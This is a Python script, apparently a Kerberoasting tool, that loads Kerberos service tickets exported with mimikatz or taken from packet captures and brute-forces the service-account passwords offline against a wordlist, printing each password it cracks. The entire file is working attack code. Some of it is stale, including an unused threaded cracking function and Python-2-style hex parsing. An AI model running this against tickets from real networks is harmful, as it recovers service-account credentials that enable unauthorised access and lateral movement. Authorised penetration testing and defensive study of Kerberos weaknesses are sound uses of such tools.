#!/usr/bin/env python3 -tt

import kerberos
from pyasn1.codec.ber import encoder, decoder
import glob

def crack(wordlist, enctickets):
	toremove = []
	while enctickets:
		word = wordlist.get()
		if word == 'ENDOFQUEUEENDOFQUEUEENDOFQUEUE':
			break
		#print "trying %s" % word
		for et in enctickets:
			kdata, nonce = kerberos.decrypt(kerberos.ntlmhash(word), 2, et[0])
			if kdata:
				print('found password for ticket %i: %s  File: %s' % (et[1], word, et[2]))
				toremove.append(et)
		for et in toremove:
			try:
				enctickets.remove(et)
			except:
				return
			if not enctickets:
				return


print('''

    USE HASHCAT, IT'S HELLA FASTER!!

''')

import argparse
import sys

parser = argparse.ArgumentParser(description='Read kerberos ticket then modify it')
parser.add_argument('wordlistfile', action='store',
				metavar='dictionary.txt', type=argparse.FileType('rb'), # windows closes it in thread
				help='the word list to use with password cracking')
parser.add_argument('files', nargs='+', metavar='file.kirbi', type=str,
				help='File name to crack. Use asterisk \'*\' for many files.\n Files are exported with mimikatz or from extracttgsrepfrompcap.py')

args = parser.parse_args()	


# load the tickets
enctickets = []
i = 0
for path in args.files:
	for f in glob.glob(path):
		with open(f, 'rb') as fd:
			data = fd.read()
		#data = open('f.read()

		if data[0] == 0x76:
			# rem dump 
			#enctickets.append((str(decoder.decode(data)[0][2][0][3][2]), i, f))
			enctickets.append(((decoder.decode(data)[0][2][0][3][2]).asOctets(), i, f))
			i += 1
		elif data[:2] == '6d':
			for ticket in data.strip().split('\n'):
				enctickets.append(((decoder.decode(ticket.decode('hex'))[0][4][3][2]).asOctets(), i, f))
				i += 1

if len(enctickets):
	print("Cracking %i tickets..." % len(enctickets))
else:
	print("No tickets found")
	sys.exit()

# load wordlist
for w in args.wordlistfile:
	word = w.decode('utf-8').strip()
	hash = kerberos.ntlmhash(word)
	for et in enctickets:
		kdata, nonce = kerberos.decrypt(hash, 2, et[0])
		if kdata:
			print('found password for ticket %i: %s  File: %s' % (et[1], word, et[2]))
			enctickets.remove(et)
			if len(enctickets) == 0:
				print('Successfully cracked all tickets')
				sys.exit()

if len(enctickets):
	print("Unable to crack %i tickets" % len(enctickets))
